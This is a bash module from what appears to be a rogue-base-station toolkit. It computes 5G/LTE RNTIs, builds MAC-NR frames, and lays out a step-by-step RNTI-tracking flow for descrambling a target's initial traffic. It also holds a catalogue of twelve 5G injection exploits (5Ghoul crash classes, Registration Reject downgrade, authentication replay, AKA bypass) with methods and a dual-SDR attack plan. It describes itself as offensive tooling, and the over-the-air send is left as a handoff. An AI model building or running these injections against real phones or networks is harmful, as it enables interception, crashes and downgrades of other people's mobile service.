#!/usr/bin/env bash
# nr_inject — 5G NR over-the-air shaping: RNTI arithmetic, MAC-NR framing,
# descrambling and the injection exploit set.
#
# SCOPE, first: this is the offence. It computes the RNTIs a shadower must
# track, builds the MAC-NR subheaders and payloads an injector sends, models
# how the initial unencrypted traffic is descrambled once those RNTIs are
# known, and carries the published 5G injection exploits (5Ghoul, TC11, the
# identity/auth-replay/AKA classes). Every byte is constructed here; the send
# itself is a named handoff to a dual-radio rig you own.
#
# Method and shapes from:
#   * Sni5Gect (USENIX Sec '25) — DL/UL injection, identity-request
#     fingerprinting, Registration-Reject downgrade (TC11), auth-replay
#     downgrade, Registration-Accept 5G-AKA bypass
#   * 5Ghoul (IEEE TDSC '25) — stateful multi-layer 5G NR crashes
#   * SF5G — RNTI tracking and descrambling of initial traffic
#
# Attack owned: O1/O17 (rogue base station, NR beam/resource surface).
#
# Resolve IMSISTING_ROOT from this script's own path (MODULE_CONVENTIONS §2).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/nr_inject"
NRJ_DIR="$LOOT_DIR/nr_inject"
mkdir -p "$MOD_TMP" "$NRJ_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

nrj_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }
nrj_norm_hex() { printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'; }
nrj_is_hex() {
    local h; h=$(nrj_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
nrj_byte() { printf '%02X' "$(( ${1:-0} & 0xFF ))" ; }

nrj_status_tsv() {
    printf 'MODULE\tnr_inject\n'
    printf 'TARGET\tNR RNTI tracking, MAC-NR framing, descramble, injection exploits\n'
    printf 'BUILDS\treal frames and RNTI arithmetic; the send is a handoff\n'
    printf 'SELFTEST\tyes\n'
}

# ── RNTI arithmetic (TS 38.321 §5.1.3, TS 36.321 §5.1.4) ────────────────
# NR 4-step RA-RNTI = 1 + s_id + 14*t_id + 14*80*f_id + 14*80*8*ul_carrier_id
# LTE RA-RNTI      = 1 + t_id + 10*f_id
nrj_ra_rnti_lte() {
    local t="${1:-}" f="${2:-}"
    [[ "$t" =~ ^[0-9]+$ && "$f" =~ ^[0-9]+$ ]] || { printf 'ERROR\tt_id and f_id must be integers\n' >&2; return 2; }
    printf 'rat\tlte\nra_rnti\t%d\nhex\t%04X\n' "$(( 1 + t + 10*f ))" "$(( 1 + t + 10*f ))"
}
nrj_ra_rnti_nr() {
    local s="${1:-0}" t="${2:-0}" f="${3:-0}" u="${4:-0}"
    local v
    for v in "$s" "$t" "$f" "$u"; do
        [[ "$v" =~ ^[0-9]+$ ]] || { printf 'ERROR\ts_id,t_id,f_id,ul_carrier must be integers\n' >&2; return 2; }
    done
    local r=$(( 1 + s + 14*t + 14*80*f + 14*80*8*u ))
    printf 'rat\tnr\ns_id\t%d\nt_id\t%d\nf_id\t%d\nul_carrier_id\t%d\nra_rnti\t%d\nhex\t%04X\n' \
        "$s" "$t" "$f" "$u" "$r" "$r"
}

# ── MAC-NR subheader (TS 38.321 §6.2.1) ─────────────────────────────────
# 1-octet: R(1) F(1) LCID(6). When F=1 the 8-bit length is replaced by a
# 16-bit length. LCID class: 0 = CCCH, 1..32 = logical channel, else reserved
# in the DL-SCH/UL-SCH tables (MAC CEs live in their own tables).
nrj_lcid_class() {
    local l="${1:-}"
    [[ "$l" =~ ^[0-9]+$ ]] && (( l <= 63 )) || { printf 'ERROR\tLCID must be 0..63\n' >&2; return 2; }
    if (( l == 0 )); then printf 'ccch'
    elif (( l >= 1 && l <= 32 )); then printf 'logical-channel'
    else printf 'reserved-%d' "$l"; fi
}
nrj_lcid_table() {
    cat <<'EOF'
lcid	class	meaning
0	ccch	Common Control Channel
1-32	logical-channel	identity of the logical channel (per the LC configuration)
33-63	reserved	reserved in the DL-SCH/UL-SCH subheader tables; MAC CE LCIDs are listed separately in TS 38.321
EOF
}
nrj_mac_sub() {
    local lcid="${1:-}" len="${2:-0}"
    [[ "$lcid" =~ ^[0-9]+$ ]] && (( lcid <= 63 )) || { printf 'ERROR\tLCID must be 0..63\n' >&2; return 2; }
    [[ "$len" =~ ^[0-9]+$ ]] || { printf 'ERROR\tlength must be numeric\n' >&2; return 2; }
    if (( len <= 255 )); then
        printf '%s%s\n' "$(nrj_byte "$(( (0 << 6) | (lcid & 0x3f) ))")" "$(nrj_byte "$len")"
    else
        printf '%s%04X\n' "$(nrj_byte "$(( (1 << 6) | (lcid & 0x3f) ))")" "$(( len & 0xFFFF ))"
    fi
}
# A MAC-NR PDU: [subheader][body] ... ; here a single SDU for a given LCID.
nrj_mac_pdu() {
    local lcid="${1:-0}" body; body=$(nrj_norm_hex "${2:-}")
    [[ -z "$body" ]] && body="00"
    nrj_is_hex "$body" || { printf 'ERROR\tbody must be hex\n' >&2; return 2; }
    local sub; sub=$(nrj_mac_sub "$lcid" "$(( ${#body} / 2 ))") || return 1
    printf 'lcid\t%s\nclass\t%s\nsubheader\t%s\nbody\t%s\npdu\t%s%s\nbytes\t%d\n' \
        "$lcid" "$(nrj_lcid_class "$lcid")" "$sub" "$body" "$sub" "$body" "$(( (${#sub}+${#body}) / 2 ))"
}

# ── DCI formats (TS 38.212 §7.3) ────────────────────────────────────────
nrj_dci_formats() {
    cat <<'EOF'
format	use
0_0	UL grant, fallback
0_1	UL grant, non-fallback
1_0	DL assignment, fallback
1_1	DL assignment, non-fallback
2_0	slot-format indication (SFI)
2_1	pre-emption indication
2_2	transmit power control (TPC) for PUCCH
2_3	TPC for SRS
EOF
}

# ── descrambling (the shadower's payoff) ────────────────────────────────
# Initial NR traffic is ciphered but the scrambling sequence is seeded by the
# RNTI. A third party who recovers the RA/TC/C-RNTI chain from the broadcast
# and control channels can descramble what it observes; this models that.
nrj_descramble() {
    cat <<'EOF'
rnti_flow	ra-rnti -> tc-rnti -> c-rnti
step1	track the PRACH occasion, compute RA-RNTI (--ra-rnti-nr), read RAR (Msg2)
step2	watch Msg3 scheduled under TC-RNTI, follow contention resolution (Msg4)
step3	on success the network promotes TC-RNTI to C-RNTI; log every value
step4	with the RNTI chain, seed the descrambler and read the initial unencrypted NAS/RRC
note	the sequence derives from the RNTI, so a missed RNTI is a missed stream
EOF
}

# ── the injection exploit set ───────────────────────────────────────────
# name | class | status(probe|handoff) | method
nrj_exploits() {
    cat <<'EOF'
rrc-setup-crash|remote-crash|probe|malformed RRCSetup in the setup state; 5Ghoul V3 class
rrc-reconfig-crash|remote-crash|probe|malformed RRCReconfiguration in the connected state; 5Ghoul V4
mac-rlc-crash|remote-crash|probe|invalid MAC/RLC PDU; 5Ghoul V5
nas-unknown-crash|remote-crash|probe|NAS PDU with an unassigned message type; 5Ghoul V6
rrc-downgrade|downgrade|probe|malformed RRCSetup variant that drops 5G; 5Ghoul V7
mtk-cellgroup-id|remote-crash|probe|out-of-range CellGroupId; 5Ghoul V15
mtk-cellgroup-cfg|remote-crash|probe|truncated CellGroupConfig; 5Ghoul V16
registration-reject|downgrade|probe|inject Registration Reject with 5GMM cause 31; the UE drops to EPC (TC11)
identity-request|fingerprint|probe|inject Identity Request; the UE answers with SUCI
auth-replay|downgrade|handoff|replay a captured Authentication Request across the T3520 window until the UE bars the cell; CVD-2024-0096
aka-bypass|auth-bypass|probe|plaintext Registration Accept with security header 4; accepted by UEs that skip the MAC check
pusch-alloc|remote-crash|probe|invalid PUSCH resource allocation in the UL grant; 5Ghoul V1
EOF
}
nrj_exploit() {
    local want="${1:-}"
    [[ -n "$want" ]] || { printf 'ERROR\tusage: --exploit <name>\n' >&2; return 2; }
    local line; line=$(nrj_exploits | awk -F'|' -v w="$want" '$1==w{print; exit}')
    [[ -n "$line" ]] || { printf 'ERROR\tunknown exploit %s\n' "$want" >&2; return 1; }
    IFS='|' read -r name cls st method <<< "$line"
    printf 'exploit\t%s\nclass\t%s\nstatus\t%s\nmethod\t%s\n' "$name" "$cls" "$st" "$method"
    case "$st" in
        probe) printf 'probe\tbuild the frame with 59_baseband_exploit (NAS classes) or the RRC/MAC shaper, then inject it in the matching state\n' ;;
        handoff) printf 'handoff\trequires two-stage sniff-then-replay on a live path; see --plan\n' ;;
    esac
}

nrj_plan() {
    cat <<'EOF'
status	handoff
what	injecting NR frames at a target UE, or shadowing a live gNB-UE link
hardware	two SDRs (USRP B210/X310) or one SDR plus an amplifier; a lab UE/modem you own; GPSDO for dual-radio timing
software	OpenAirInterface or srsRAN for the gNB side, plus a Sni5Gect/5Ghoul-style injection patch
flow	1. compute the RNTIs here  2. sync and track the UE to the target state  3. frame the payload  4. inject in that state
note	nothing here is transmitted; the over-the-air step is this handoff, against equipment you own
EOF
}

nrj_selftest() {
    local bad=0 nchk=0
    chk() {
        nchk=$(( nchk + 1 ))
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    trap 'rm -rf "$d"' EXIT
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export NRJ_DIR="$d/loot/nr_inject"
    mkdir -p "$NRJ_DIR"

    # 1. RA-RNTI. LTE: 1 + t_id + 10*f_id (TS 36.321). NR: the 4-step formula
    #    (TS 38.321 §5.1.3).
    chk lte-0-0 "$(fld "$(nrj_ra_rnti_lte 0 0)" ra_rnti)" "1"
    chk lte-9-0 "$(fld "$(nrj_ra_rnti_lte 9 0)" ra_rnti)" "10"
    chk lte-0-1 "$(fld "$(nrj_ra_rnti_lte 0 1)" ra_rnti)" "11"
    chk lte-9-5 "$(fld "$(nrj_ra_rnti_lte 9 5)" ra_rnti)" "60"
    chk lte-bad "$(nrj_ra_rnti_lte x 0 >/dev/null 2>&1; echo $?)" "2"
    chk nr-0 "$(fld "$(nrj_ra_rnti_nr 0 0 0 0)" ra_rnti)" "1"
    chk nr-s1 "$(fld "$(nrj_ra_rnti_nr 1 0 0 0)" ra_rnti)" "2"
    chk nr-t1 "$(fld "$(nrj_ra_rnti_nr 0 1 0 0)" ra_rnti)" "15"
    chk nr-f1 "$(fld "$(nrj_ra_rnti_nr 0 0 1 0)" ra_rnti)" "1121"

    # 2. LCID class boundaries (TS 38.321 §6.2.1).
    chk lcid-0 "$(nrj_lcid_class 0)" "ccch"
    chk lcid-1 "$(nrj_lcid_class 1)" "logical-channel"
    chk lcid-32 "$(nrj_lcid_class 32)" "logical-channel"
    chk lcid-33 "$(nrj_lcid_class 33)" "reserved-33"
    chk lcid-63 "$(nrj_lcid_class 63)" "reserved-63"
    chk lcid-bad "$(nrj_lcid_class 64 >/dev/null 2>&1; echo $?)" "2"

    # 3. MAC-NR subheader: F=0 (8-bit length) below 256, F=1 above.
    chk sub-ccch-8 "$(nrj_mac_sub 0 8)" "0008"
    chk sub-lc1-8  "$(nrj_mac_sub 1 8)" "0108"
    chk sub-f1-300 "$(nrj_mac_sub 5 300)" "45012C"
    chk mac-pdu "$(fld "$(nrj_mac_pdu 0 aabbcc)" pdu)" "0003aabbcc"
    chk mac-pdu-len "$(fld "$(nrj_mac_pdu 0 aabbcc)" bytes)" "5"

    # 4. DCI formats.
    chk dci-1_1 "$(nrj_dci_formats | awk -F'\t' '$1=="1_1" && $2 ~ /DL assignment/{print "ok"}')" "ok"

    # 5. Exploit catalogue: entries, probe/handoff split, unknown fails.
    chk expl-count "$(nrj_exploits | wc -l | tr -d ' ')" "12"
    chk expl-tc11 "$(fld "$(nrj_exploit registration-reject)" class)" "downgrade"
    chk expl-aka "$(fld "$(nrj_exploit aka-bypass)" class)" "auth-bypass"
    chk expl-replay-status "$(fld "$(nrj_exploit auth-replay)" status)" "handoff"
    chk expl-unknown "$(nrj_exploit nope >/dev/null 2>&1; echo $?)" "1"

    # 6. Scope, behavioural: no transmit verb.
    chk scope-no-send "$(nrj_cli_main --send >/dev/null 2>&1; echo $?)" "2"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

nrj_menu() {
    while true; do
        banner
        echo "  === 5G NR Injection ==="
        echo
        cat <<'M'
  [1]  RA-RNTI (LTE)
  [2]  RA-RNTI (NR 4-step)
  [3]  LCID reference
  [4]  Build a MAC-NR PDU
  [5]  DCI formats
  [6]  Descramble model
  [7]  Exploit catalogue
  [8]  Over-the-air handoff
  [0]  back
M
        read -rp "  choice> " c || return 0
        case "$c" in
            1) read -rp "  t_id> " t; read -rp "  f_id> " f; nrj_ra_rnti_lte "$t" "$f"; read -rp "  enter " _ ;;
            2) read -rp "  s_id> " s; read -rp "  t_id> " t; read -rp "  f_id> " f; read -rp "  ul_carrier> " u
               nrj_ra_rnti_nr "${s:-0}" "${t:-0}" "${f:-0}" "${u:-0}"; read -rp "  enter " _ ;;
            3) nrj_lcid_table; read -rp "  enter " _ ;;
            4) read -rp "  lcid> " l; read -rp "  body hex> " b; nrj_mac_pdu "${l:-0}" "$b"; read -rp "  enter " _ ;;
            5) nrj_dci_formats; read -rp "  enter " _ ;;
            6) nrj_descramble; read -rp "  enter " _ ;;
            7) nrj_exploits; read -rp "  enter " _ ;;
            8) nrj_plan; read -rp "  enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

nrj_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)  nrj_status_tsv ;;
        --ra-rnti-lte) nrj_ra_rnti_lte "${1:-}" "${2:-}" ;;
        --ra-rnti-nr)  nrj_ra_rnti_nr "${1:-0}" "${2:-0}" "${3:-0}" "${4:-0}" ;;
        --lcid)        nrj_lcid_class "${1:-}" ;;
        --lcid-table)  nrj_lcid_table ;;
        --mac-pdu)     nrj_mac_pdu "${1:-0}" "${2:-}" ;;
        --mac-sub)     nrj_mac_sub "${1:-0}" "${2:-0}" ;;
        --dci)         nrj_dci_formats ;;
        --descramble)  nrj_descramble ;;
        --exploits)    nrj_exploits ;;
        --exploit)     nrj_exploit "${1:-}" ;;
        --plan)        nrj_plan ;;
        --selftest)    nrj_selftest ;;
        --menu)        nrj_menu ;;
        *)
            cat >&2 <<EOF
5G NR Injection — RNTI arithmetic, MAC-NR framing, descramble, exploits

Usage: $0 COMMAND
  --status-tsv                 module state as TSV
  --ra-rnti-lte <t_id> <f_id>
  --ra-rnti-nr <s_id> <t_id> <f_id> <ul_carrier>
  --lcid <n>                   LCID class; --lcid-table for the reference
  --mac-pdu <lcid> <body_hex>  build a MAC-NR PDU
  --mac-sub <lcid> <len>       build one MAC-NR subheader
  --dci                        NR DCI format reference
  --descramble                 the RNTI->plaintext model
  --exploits | --exploit <n>   the injection exploit set
  --plan                       dual-radio handoff
  --selftest                   verify the arithmetic and framing
  --menu                       interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    nrj_cli_main "$@"
fi
